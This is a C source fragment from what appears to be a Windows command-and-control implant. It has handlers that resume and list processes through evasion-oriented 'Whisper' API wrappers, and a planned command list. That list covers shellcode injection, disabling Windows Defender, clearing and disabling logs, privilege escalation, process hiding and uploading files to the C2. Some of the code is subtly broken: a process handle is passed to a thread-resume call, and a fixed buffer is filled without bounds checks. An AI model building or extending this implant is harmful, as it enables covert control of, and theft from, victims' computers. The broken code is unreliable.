void resume_process(OutboundJsonDataStruct* response_struct, char* args) {
    char* context = NULL;
    char* pid_str = strtok_s(args, " ", &context);

    if (!pid_str) {
        set_response_data(response_struct, "Invalid arguments. Expected: <PID>");
        return;
    }

    DWORD pid = strtoul(pid_str, NULL, 10);

    HANDLE hProcess = WhisperOpenProcess(PROCESS_SUSPEND_RESUME, FALSE, pid);
    if (hProcess == NULL) {
        DWORD error = GetLastError();
        char error_message[256];
        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
        set_response_data(response_struct, error_message);
        return;
    }

    if (WhisperResumeThread(hProcess) != (DWORD)-1) {
        set_response_data(response_struct, "Process resumed successfully");
    } else {
        DWORD error = GetLastError();
        char error_message[256];
        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
        set_response_data(response_struct, error_message);
    }

    WhisperCloseHandle(hProcess);
}

// [ ] Whisper Convert
void list_processes(OutboundJsonDataStruct* response_struct) {
    HANDLE hProcessSnapshot = INVALID_HANDLE_VALUE;
    PROCESSENTRY32 pe32;

    pe32.dwSize = sizeof(PROCESSENTRY32);

    hProcessSnapshot = WhisperCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnapshot == INVALID_HANDLE_VALUE) {
        DWORD error = GetLastError();
        char error_message[256];
        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
        set_response_data(response_struct, error_message);
        return;
    }

    char processList[8192] = ""; // Adjust size as needed.  Consider dynamic allocation for very large lists.
    char tempProcessInfo[512]; // Temporary buffer for each process's info

    if (WhisperProcess32First(hProcessSnapshot, &pe32)) {
        do {
            snprintf(tempProcessInfo, sizeof(tempProcessInfo), "%lu\t%s\n", pe32.th32ProcessID, pe32.szExeFile); // PID and process name
            strcat(processList, tempProcessInfo);
        } while (Process32Next(hProcessSnapshot, &pe32));
    }

    WhisperCloseHandle(hProcessSnapshot);

    if (strlen(processList) == 0) {
        set_response_data(response_struct, "No processes found.");
    } else {
        set_response_data(response_struct, processList);
    }
}


/*
 Stub commands for things that can to be added for more functionality

*/

// File Operations
// void write_file(response_struct, path, contents) - Write contents to a file
// void read_file(response_struct, path) - Read contents of a file
// void delete_file(response_struct, path) - Delete a file
// void append_file(response_struct, path, contents) - Append data to an existing file
// void rename_file(response_struct, old_path, new_path) - Rename or move a file
// void copy_file(response_struct, src, dest) - Copy a file from one location to another
// void download_file(response_struct, url, dest) - Download a file from a URL
// void upload_file(response_struct, src, dest) - Upload a file to the C2
// void search_file(response_struct, dir, pattern) - Search for files matching a wildcard pattern

// Directory Operations [NOT WHISPER_WINAPI YET]
// [X] void mkdir(response_struct, path) - Create a directory
// [X] void rmdir(response_struct, path) - Remove a directory
// [X] void cd(response_struct, path) - Change directory
// [X] void pwd(response_struct) - Get current working directory
// [X] void ls(response_struct, path) - List files in a directory //not great but works

// Process and Execution
// [ ] void start_process(response_struct, command) - Start a new process
// [ ]  void kill_process(response_struct, pid) - Kill a process by PID
// [ ]  void suspend_process(response_struct, pid) - Suspend a process
// [ ]  void resume_process(response_struct, pid) - Resume a suspended process

// System Information
// void get_username(response_struct) - Get the current username
// void get_system_info(response_struct) - Retrieve system information
// void get_os_version(response_struct) - Get OS version details
// void get_ip(response_struct) - Retrieve the system’s IP address
// void get_env_vars(response_struct) - Get a list of environment variables

// Network Operations
// void get_file_http(response_struct, url) - Fetch a file over HTTP
// void upload_file_http(response_struct, src, url) - Upload a file via HTTP POST
// void ping(response_struct, target) - Send a ping to a target host
// void port_scan(response_struct, target, start_port, end_port) - Scan open ports on a target

// C2 Interaction
// void sleep(response_struct, seconds) - Pause execution for a given time
// void checkin(response_struct) - Send a beacon/check-in message to C2
// void change_c2_server(response_struct, new_address) - Update the C2 server address

// Stealth & Evasion
// void inject_shellcode(response_struct, pid, shellcode) - Inject shellcode into a process
// void hide_process(response_struct, pid) - Attempt to hide a running process
// void disable_defender(response_struct) - Try to disable Windows Defender
// void elevate_privileges(response_struct) - Attempt to escalate privileges
// void clear_logs(response_struct) - Clear system logs for stealth
// void disable_event_logging(response_struct) - Disable Windows event logging


